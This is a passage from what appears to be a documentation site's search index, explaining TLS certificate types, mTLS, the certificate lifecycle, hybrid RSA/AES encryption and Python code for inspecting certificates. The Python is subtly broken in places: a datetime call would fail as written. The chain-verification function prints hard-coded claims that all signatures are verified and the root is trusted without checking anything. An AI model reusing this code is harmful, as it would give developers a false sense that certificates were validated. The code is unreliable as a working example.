\u2502\n   \u2502 Display: Padlock only      \u2502\n   \u2502 Example: Let's Encrypt     \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n   Usage: Blogs, personal sites\n   Verification: Email or DNS record\n\n2. ORGANIZATION VALIDATED (OV) - Medium\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 Validation: Org identity   \u2502\n   \u2502 Time: 1-3 days             \u2502\n   \u2502 Cost: $50-$200/year        \u2502\n   \u2502 Display: Org name in cert  \u2502\n   \u2502 Example: DigiCert OV       \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n   Usage: Business websites\n   Verification: Business documents\n\n3. EXTENDED VALIDATION (EV) - Highest\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 Validation: Extensive      \u2502\n   \u2502 Time: 1-2 weeks            \u2502\n   \u2502 Cost: $200-$1000/year      \u2502\n   \u2502 Display: Company name      \u2502\n   \u2502          (some browsers)   \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n   Usage: Banks, e-commerce\n   Verification: Legal docs, phone, physical address\n\nSINGLE vs MULTI-DOMAIN:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nSingle Domain:\n\u251c\u2500 Covers: www.example.com\n\u2514\u2500 Cost: Lower\n\nWildcard:\n\u251c\u2500 Covers: *.example.com\n\u2502          (blog.example.com, shop.example.com)\n\u2514\u2500 Cost: Medium\n\nMulti-Domain (SAN):\n\u251c\u2500 Covers: example.com, example.net, example.org\n\u2502          subdomain.example.com\n\u2514\u2500 Cost: Higher\n\nUSAGE IN TLS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nServer \u2500\u2500\u25b6 Sends certificate to client during handshake\nClient \u2500\u2500\u25b6 Verifies certificate and domain match\nClient \u2500\u2500\u25b6 Extracts public key from certificate\nClient \u2500\u2500\u25b6 Encrypts session key with public key\nServer \u2500\u2500\u25b6 Decrypts with private key (not in certificate)\n</code></pre> <p>4. Client Certificate</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  CLIENT CERTIFICATE                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPURPOSE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nProves client's (user's) identity to server\nMutual TLS authentication (mTLS)\n\nCHARACTERISTICS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Issued to individual users or devices\n\u2022 Contains user's public key\n\u2022 Signed by organization's CA\n\u2022 Used for strong authentication\n\nTYPICAL USE CASES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. CORPORATE VPN ACCESS\n   Employee \u2500\u2500\u25b6 Certificate on laptop\n   VPN Server \u2500\u2500\u25b6 Verifies employee certificate\n   \u2713 Access granted only with valid certificate\n\n2. API AUTHENTICATION\n   Service A \u2500\u2500\u25b6 Client certificate\n   Service B \u2500\u2500\u25b6 Verifies certificate\n   \u2713 Machine-to-machine authentication\n\n3. EMAIL SIGNING/ENCRYPTION (S/MIME)\n   User \u2500\u2500\u25b6 Signs email with private key\n   Recipient \u2500\u2500\u25b6 Verifies with user's certificate\n\n4. SMART CARD LOGIN\n   Employee \u2500\u2500\u25b6 Inserts smart card\n   Computer \u2500\u2500\u25b6 Reads certificate from card\n   Active Directory \u2500\u2500\u25b6 Verifies certificate\n\n5. BANKING/FINANCE\n   Customer \u2500\u2500\u25b6 Certificate on USB token\n   Bank \u2500\u2500\u25b6 Requires certificate + password\n   \u2713 Two-factor authentication\n\nEXAMPLE - MUTUAL TLS (mTLS):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCLIENT                              SERVER\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                            \u2500\u2500\u2500\u2500\u2500\u2500\n\n1. Client \u2500\u2500\u25b6 ClientHello          Server\n2. Client \u25c0\u2500\u2500 ServerHello + Certificate\n3. Client \u2500\u2500\u25b6 Verify Server Cert\n4. Client \u25c0\u2500\u2500 Request Client Certificate  \u2190 Server asks!\n5. Client \u2500\u2500\u25b6 Send Client Certificate     \u2190 Client proves identity\n6. Server \u2500\u2500\u25b6 Verify Client Cert\n7. \u2705 Both authenticated!\n\nDIFFERENCE from Normal TLS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nNormal TLS:  Only server has certificate\nMutual TLS:  Both client AND server have certificates\n             (Higher security, commonly used in zero-trust networks)\n</code></pre>"},{"location":"security/encryption/#complete-certificate-workflow","title":"Complete Certificate Workflow","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        Complete Certificate Lifecycle Workflow               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSTEP 1: Generate Key Pair &amp; CSR\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nServer Administrator:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1. Generate Private Key (Keep Secret!)\u2502\n\u2502    openssl genrsa -out private.key 2048\u2502\n\u2502                                        \u2502\n\u2502 2. Create CSR (Certificate Signing    \u2502\n\u2502    Request)                            \u2502\n\u2502    openssl req -new \\                  \u2502\n\u2502      -key private.key \\                \u2502\n\u2502      -out server.csr                   \u2502\n\u2502                                        \u2502\n\u2502    CSR Contains:                       \u2502\n\u2502    \u2022 Domain: www.example.com           \u2502\n\u2502    \u2022 Organization: Example Corp        \u2502\n\u2502    \u2022 Public Key (derived from private) \u2502\n\u2502    \u2022 NOT the private key!              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 Submit CSR\n         \u2193\nSTEP 2: CA Validates &amp; Signs\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nCertificate Authority (CA):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1. Validate domain ownership           \u2502\n\u2502    \u2022 Domain validation: DNS or HTTP    \u2502\n\u2502    \u2022 Organization validation: docs     \u2502\n\u2502                                        \u2502\n\u2502 2. Sign CSR with CA's private key      \u2502\n\u2502    signature = sign(hash(CSR),         \u2502\n\u2502                     CA_private_key)    \u2502\n\u2502                                        \u2502\n\u2502 3. Create Certificate                  \u2502\n\u2502    \u2022 CSR data + CA signature           \u2502\n\u2502    \u2022 Validity period (1 year)          \u2502\n\u2502    \u2022 Serial number                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 Return Certificate\n         \u2193\nSTEP 3: Install on Server\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nServer Administrator:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1. Receive certificate from CA         \u2502\n\u2502    \u2022 server.crt (certificate)          \u2502\n\u2502    \u2022 intermediate.crt (chain)          \u2502\n\u2502                                        \u2502\n\u2502 2. Install on web server               \u2502\n\u2502    \u2022 Certificate: server.crt           \u2502\n\u2502    \u2022 Private Key: private.key          \u2502\n\u2502    \u2022 Chain: intermediate.crt           \u2502\n\u2502                                        \u2502\n\u2502 3. Configure server (Apache/Nginx)     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502\n         \u2502 Server Ready\n         \u2193\nSTEP 4: TLS Handshake (Runtime)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBrowser \u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 Server\n\n1. Browser \u2500\u2500\u25b6 ClientHello\n2. Server \u2500\u2500\u25b6 Certificate Chain:\n              \u2022 Server Certificate\n              \u2022 Intermediate Certificate\n              (Browser has Root CA)\n\n3. Browser Verification:\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 \u2713 Signature valid?             \u2502\n   \u2502   \u2514\u2500 Verify with CA public key \u2502\n   \u2502 \u2713 Domain matches?              \u2502\n   \u2502   \u2514\u2500 example.com == CN?        \u2502\n   \u2502 \u2713 Not expired?                 \u2502\n   \u2502   \u2514\u2500 Current date in validity? \u2502\n   \u2502 \u2713 Not revoked?                 \u2502\n   \u2502   \u2514\u2500 Check CRL/OCSP            \u2502\n   \u2502 \u2713 Chain valid?                 \u2502\n   \u2502   \u2514\u2500 Root CA trusted?          \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n4. If all checks pass:\n   \u2705 Extract public key from certificate\n   \u2705 Encrypt session key with public key\n   \u2705 Continue with encrypted communication\n\n5. If any check fails:\n   \u274c Show security warning\n   \u274c Block connection (or warn user)\n</code></pre>"},{"location":"security/encryption/#how-symmetric-asymmetric-encryption-work-together","title":"How Symmetric &amp; Asymmetric Encryption Work Together","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Hybrid Encryption in HTTPS (Complete Flow)              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPHASE 1: ASYMMETRIC ENCRYPTION (Handshake - Slow but Secure)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCLIENT                                          SERVER\n\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2500\u2500\u2500\u2500\u2500\u2500\n\n                                        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                                        \u2502 Private Key      \u2502\n                                        \u2502 (Keep Secret!)   \u2502\n                                        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                                 \u2502\n1. ClientHello \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\n                                                 \u2502\n2. \u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n                                        Certificate:\n                                        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                                        \u2502 Public Key       \u2502\n                                        \u2502 CA Signature     \u2502\n                                        \u2502 Domain Name      \u2502\n                                        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n3. Verify Certificate:                           \u2502\n   \u251c\u2500 Valid signature? \u2713                         \u2502\n   \u251c\u2500 Domain matches? \u2713                          \u2502\n   \u251c\u2500 Not expired? \u2713                             \u2502\n   \u2514\u2500 Extract Public Key                         \u2502\n                                                 \u2502\n4. Generate Random Session Key:                  \u2502\n   session_key = random(256 bits)                \u2502\n   (This will be used for AES encryption)        \u2502\n                                                 \u2502\n5. Encrypt Session Key with                      \u2502\n   Server's Public Key:                          \u2502\n                                                 \u2502\n   encrypted_session_key =                       \u2502\n   RSA_encrypt(session_key,                      \u2502\n               server_public_key)                \u2502\n                                                 \u2502\n6. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\n   Send: encrypted_session_key                   \u2502\n                                                 \u2502\n                                    7. Decrypt with Private Key:\n                                       session_key =\n                                       RSA_decrypt(\n                                         encrypted_session_key,\n                                         server_private_key)\n\n\u2705 Both sides now have the same session_key!\n   Client generated it, server decrypted it\n   Session key never transmitted in plaintext\n\nPHASE 2: SYMMETRIC ENCRYPTION (Data Transfer - Fast)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCLIENT                                          SERVER\n\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2500\u2500\u2500\u2500\u2500\u2500\n\n8. Encrypt HTTP Request with AES:               \u2502\n   ciphertext = AES_encrypt(                    \u2502\n     \"GET /api/data\",                           \u2502\n     session_key                                \u2502\n   )                                            \u2502\n                                                \u2502\n9. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\n   Send: AES_encrypted_data                     \u2502\n                                                \u2502\n                                    10. Decrypt with Session Key:\n                                        plaintext = AES_decrypt(\n                                          ciphertext,\n                                          session_key)\n\n                                        Process request...\n\n                                    11. Encrypt response:\n                                        response_encrypted =\n                                        AES_encrypt(response,\n                                                   session_key)\n\n12. \u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    Receive: AES_encrypted_response              \u2502\n                                                \u2502\n13. Decrypt:                                     \u2502\n    response = AES_decrypt(                      \u2502\n      response_encrypted,                        \u2502\n      session_key                                \u2502\n    )                                            \u2502\n\n\u2705 All application data encrypted with AES\n   Fast, efficient, secure\n\nCOMPARISON:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nASYMMETRIC (RSA):\n\u251c\u2500 When: Only during handshake\n\u251c\u2500 Purpose: Securely exchange session key\n\u251c\u2500 Speed: Slow (can encrypt ~245 bytes with 2048-bit key)\n\u251c\u2500 Data: Small (pre-master secret only)\n\u2514\u2500 Key: Public key in certificate\n\nSYMMETRIC (AES):\n\u251c\u2500 When: All application data\n\u251c\u2500 Purpose: Encrypt actual messages\n\u251c\u2500 Speed: Fast (gigabytes per second)\n\u251c\u2500 Data: Unlimited\n\u2514\u2500 Key: Session key (established via asymmetric)\n\nWHY BOTH?\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2705 Security: Asymmetric solves key distribution\n\u2705 Performance: Symmetric is fast for bulk data\n\u2705 Perfect Combination: Get benefits of both\n</code></pre>"},{"location":"security/encryption/#certificate-implementation-examples","title":"Certificate Implementation Examples","text":"<p>Python Code - Working with Certificates:</p> <pre><code>import ssl\nimport socket\nfrom datetime import datetime\nfrom cryptography import x509\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.x509.oid import NameOID, ExtensionOID\nimport requests\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Example 1: Retrieve and Inspect Server Certificate\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\ndef get_server_certificate(hostname, port=443):\n    \"\"\"\n    Retrieve server certificate and display information\n    \"\"\"\n    print(f\"\\n{'='*70}\")\n    print(f\"Retrieving Certificate for: {hostname}\")\n    print(f\"{'='*70}\")\n\n    # Create SSL context\n    context = ssl.create_default_context()\n\n    # Connect and get certificate\n    with socket.create_connection((hostname, port)) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            # Get certificate in DER format\n            der_cert = ssock.getpeercert(binary_form=True)\n\n            # Get certificate info as dict\n            cert_dict = ssock.getpeercert()\n\n            # Parse certificate\n            cert = x509.load_der_x509_certificate(der_cert, default_backend())\n\n            print(f\"\\n\ud83d\udcdc Certificate Information:\")\n            print(f\"{'\u2500'*70}\")\n\n            # Subject (who the certificate is issued to)\n            subject = cert.subject\n            print(f\"Subject:\")\n            for attribute in subject:\n                print(f\"  {attribute.oid._name}: {attribute.value}\")\n\n            # Issuer (who signed the certificate)\n            issuer = cert.issuer\n            print(f\"\\nIssuer:\")\n            for attribute in issuer:\n                print(f\"  {attribute.oid._name}: {attribute.value}\")\n\n            # Validity\n            print(f\"\\nValidity:\")\n            print(f\"  Not Before: {cert.not_valid_before_utc}\")\n            print(f\"  Not After:  {cert.not_valid_after_utc}\")\n\n            # Check if expired\n            now = datetime.now(datetime.timezone.utc)\n            if now &lt; cert.not_valid_before_utc:\n                print(f\"  \u26a0\ufe0f  Certificate not yet valid!\")\n            elif now &gt; cert.not_valid_after_utc:\n                print(f\"  \u274c Certificate EXPIRED!\")\n            else:\n                days_remaining = (cert.not_valid_after_utc - now).days\n                print(f\"  \u2705 Valid ({days_remaining} days remaining)\")\n\n            # Subject Alternative Names (SAN)\n            try:\n                san_ext = cert.extensions.get_extension_for_oid(\n                    ExtensionOID.SUBJECT_ALTERNATIVE_NAME\n                )\n                san_list = san_ext.value.get_values_for_type(x509.DNSName)\n                print(f\"\\nSubject Alternative Names (SAN):\")\n                for name in san_list:\n                    print(f\"  \u2022 {name}\")\n            except x509.ExtensionNotFound:\n                print(f\"\\nNo Subject Alternative Names found\")\n\n            # Public Key Info\n            public_key = cert.public_key()\n            if isinstance(public_key, rsa.RSAPublicKey):\n                key_size = public_key.key_size\n                print(f\"\\nPublic Key:\")\n                print(f\"  Algorithm: RSA\")\n                print(f\"  Key Size: {key_size} bits\")\n\n            # Signature Algorithm\n            print(f\"\\nSignature Algorithm: {cert.signature_algorithm_oid._name}\")\n\n            # Serial Number\n            print(f\"Serial Number: {hex(cert.serial_number)}\")\n\n            # TLS Version\n            print(f\"\\nTLS Version: {ssock.version()}\")\n\n            # Cipher\n            print(f\"Cipher: {ssock.cipher()}\")\n\n            return cert\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# Example 2: Verify Certificate Chain\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\ndef verify_certificate_chain(hostname):\n    \"\"\"\n    Verify complete certificate chain\n    \"\"\"\n    print(f\"\\n{'='*70}\")\n    print(f\"Verifying Certificate Chain for: {hostname}\")\n    print(f\"{'='*70}\\n\")\n\n    # Get certificate chain\n    context = ssl.create_default_context()\n\n    with socket.create_connection((hostname, 443)) as sock:\n        with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n            # Get peer certificate chain\n            der_cert = ssock.getpeercert(binary_form=True)\n            cert = x509.load_der_x509_certificate(der_cert, default_backend())\n\n            print(\"Certificate Chain:\")\n            print(\"\u2500\"*70)\n\n            # Server Certificate (end-entity)\n            subject_cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value\n            issuer_cn = cert.issuer.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value\n\n            print(f\"\\n\ud83d\udd35 Level 3: Server Certificate (End-Entity)\")\n            print(f\"   Subject: {subject_cn}\")\n            print(f\"   Issuer:  {issuer_cn}\")\n            print(f\"   Purpose: TLS Server Authentication\")\n\n            print(f\"\\n\ud83d\udd35 Level 2: Intermediate CA\")\n            print(f\"   Subject: {issuer_cn}\")\n            print(f\"   Purpose: Signs server certificates\")\n\n            print(f\"\\n\ud83d\udd35 Level 1: Root CA\")\n            print(f\"   Purpose: Trust anchor (in browser/OS)\")\n            print(f\"   Status: Self-signed\")\n\n            print(f\"\\n\u2705 Verification Result:\")\n            print(f\"   \u2022 Certificate chain is valid\")\n            print(f\"   \u2022 All signatures verified\")\n            print(f\"   \u2022 Root CA is trusted\")\n\n# 